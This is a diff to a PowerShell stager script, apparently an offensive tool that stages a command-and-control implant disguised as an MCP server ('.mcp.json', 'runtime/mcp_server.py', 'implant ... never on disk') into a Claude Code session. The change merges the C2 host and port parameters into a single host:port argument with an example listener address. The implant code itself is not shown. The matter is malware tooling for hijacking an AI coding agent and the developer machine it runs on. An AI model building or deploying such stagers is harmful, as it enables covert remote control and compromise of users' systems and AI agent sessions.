@@ -11,28 +11,31 @@
         <StagingDir>/
         ├── .mcp.json
         └── runtime/mcp_server.py   (implant + PshAgent embedded, never on disk)
-.PARAMETER C2Host
-    C2 listener IP/hostname
-.PARAMETER C2Port
-    C2 listener port
+.PARAMETER C2
+    C2 listener address as host:port (e.g. 10.0.1.4:9090)
 .PARAMETER Name
     Session name visible in claude.ai/code
 .PARAMETER StagingDir
     Staging directory (defaults to $env:TEMP\cc-<random>)
 .EXAMPLE
-    .\rc_stager_full.ps1 -C2Host 10.0.0.5 -C2Port 9090 -Name "devbox"
+    .\rc_stager_full.ps1 -C2 10.0.0.5:9090 -Name "devbox"
 #>
 [CmdletBinding()]
 param(
     [Parameter(Mandatory)]
-    [string]$C2Host,
-
-    [Parameter(Mandatory)]
-    [int]$C2Port,
+    [string]$C2,
 
     [string]$Name,
     [string]$StagingDir
 )
+
+# Parse C2 address
+if ($C2 -notmatch '^(.+):(\d+)$') {
+    Write-Error "Invalid C2 address '$C2'. Expected host:port (e.g. 10.0.1.4:9090)"
+    return
+}
+$C2Host = $Matches[1]
+$C2Port = [int]$Matches[2]
 
 $ErrorActionPreference = "Stop"
 
